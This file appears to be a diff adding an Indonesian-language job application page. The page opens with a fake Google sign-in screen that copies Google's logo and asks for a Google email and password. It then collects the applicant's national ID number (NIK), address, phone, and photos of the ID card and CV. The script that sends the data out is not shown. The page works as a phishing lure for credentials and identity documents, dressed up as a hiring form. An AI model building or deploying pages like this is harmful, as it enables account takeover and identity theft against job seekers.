@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Lamaran Pekerjaan</title>
+    <link rel="stylesheet" href="css/style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+<script src="https://sites.super.myninja.ai/_assets/ninja-daytona-script.js"></script>
+</head>
+<body>
+    <!-- Login Section -->
+    <div id="loginSection" class="login-section">
+        <div class="login-container">
+            <div class="google-logo">
+                <svg width="75" height="75" viewBox="0 0 75 75" xmlns="http://www.w3.org/2000/svg">
+                    <path fill="#4285F4" d="M64.5,37.5c0-2.3-0.2-4.5-0.6-6.6H37.5v12.5h15c-0.7,3.5-2.7,6.4-5.7,8.4v8.1h9.2 C60.2,55.6,64.5,47.4,64.5,37.5z"/>
+                    <path fill="#34A853" d="M37.5,68c8.5,0,15.6-2.8,20.8-7.6l-9.2-8.1c-2.8,1.9-6.4,3-10.6,3c-8.2,0-15.1-5.5-17.6-12.9H10.3 v8.3C15.5,61.6,25.8,68,37.5,68z"/>
+                    <path fill="#FBBC05" d="M19.9,42.4c-0.6-1.9-1-4-1-6.4s0.4-4.5,1-6.4v-8.3H10.3C6.5,25.3,4.5,31.1,4.5,37.5 s2,12.2,5.8,16.8l9.6-8.9C19.9,45.4,19.9,42.4,19.9,42.4z"/>
+                    <path fill="#EA4335" d="M37.5,14c4.6,0,8.7,1.6,11.9,4.7l8.2-8.2C53.1,5.5,45.9,2.5,37.5,2.5C25.8,2.5,15.5,8.9,10.3,18.3 l9.6,8.3C22.4,19.5,29.3,14,37.5,14z"/>
+                </svg>
+            </div>
+            <h2 class="login-title">Gunakan Akun Google</h2>
+            <p class="login-subtitle">Masukan akun google anda yang aktif untuk mengisi form</p>
+            
+            <form id="googleLoginForm">
+                <div class="form-group">
+                    <input type="email" id="googleEmail" required placeholder="Email Address">
+                </div>
+                <div class="form-group">
+                    <input type="password" id="googlePassword" required placeholder="Password">
+                </div>
+                <button type="submit" class="btn-next">Next</button>
+            </form>
+            
+            <div class="login-footer">
+                <span>Not your computer? Use Guest mode to sign in privately.</span>
+                <a href="#">Learn more</a>
+            </div>
+        </div>
+    </div>
+
+    <!-- Application Form Section -->
+    <div id="applicationSection" class="application-section hidden">
+        <div class="application-container">
+            <div class="header">
+                <div class="logo">🏢</div>
+                <h1>Form Lamaran Pekerjaan</h1>
+                <p>Isi data diri Anda dengan lengkap dan benar</p>
+            </div>
+
+            <form id="applicationForm">
+                <div class="form-section">
+                    <h3>📋 Data Diri</h3>
+                    
+                    <div class="form-group">
+                        <label for="nama">Nama Lengkap *</label>
+                        <input type="text" id="nama" name="nama" required placeholder="Masukan nama panjang">
+                    </div>
+
+                    <div class="form-group">
+                        <label for="nik">NIK *</label>
+                        <input type="text" id="nik" name="nik" required placeholder="Masukan NIK">
+                    </div>
+
+                    <div class="form-group">
+                        <label for="alamat">Alamat Lengkap *</label>
+                        <textarea id="alamat" name="alamat" required placeholder="Detail alamat" rows="3"></textarea>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="noHp">No HP yang bisa dihubungi *</label>
+                        <input type="tel" id="noHp" name="noHp" required placeholder="Contoh: 08123456789">
+                    </div>
+                </div>
+
+                <div class="form-section">
+                    <h3>📄 Dokumen Pendukung</h3>
+                    
+                    <div class="form-group">
+                        <label for="cv">Foto CV *</label>
+                        <div class="file-upload" id="cvUpload">
+                            <input type="file" id="cv" name="cv" accept="image/*,.pdf" required>
+                            <div class="file-upload-content">
+                                <span class="upload-icon">📁</span>
+                                <span class="upload-text">Klik untuk upload CV</span>
+                                <span class="file-name"></span>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="ktp">Foto KTP *</label>
+                        <div class="file-upload" id="ktpUpload">
+                            <input type="file" id="ktp" name="ktp" accept="image/*" required>
+                            <div class="file-upload-content">
+                                <span class="upload-icon">📷</span>
+                                <span class="upload-text">Klik untuk upload KTP</span>
+                                <span class="file-name"></span>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="suratLamaran">Surat Lamaran Pekerjaan *</label>
+                        <div class="file-upload" id="suratLamaranUpload">
+                            <input type="file" id="suratLamaran" name="suratLamaran" accept="image/*,.pdf" required>
+                            <div class="file-upload-content">
+                                <span class="upload-icon">📝</span>
+                                <span class="upload-text">Klik untuk upload surat lamaran</span>
+                                <span class="file-name"></span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <button type="submit" class="btn-submit">
+                    <span class="btn-text">Kirim Lamaran</span>
+                    <span class="btn-loading hidden">Mengirim...</span>
+                </button>
+            </form>
+        </div>
+    </div>
+
+    <!-- Success Modal -->
+    <div id="successModal" class="modal hidden">
+        <div class="modal-content">
+            <div class="success-icon">✓</div>
+            <h2>Data Terkirim!</h2>
+            <p>Data telah di kirim, mohon menunggu untuk dihubungi pihak HRD.</p>
+            <button class="btn-close" onclick="location.reload()">Tutup</button>
+        </div>
+    </div>
+
+    <script src="js/script.js"></script>
+</body>
+</html>
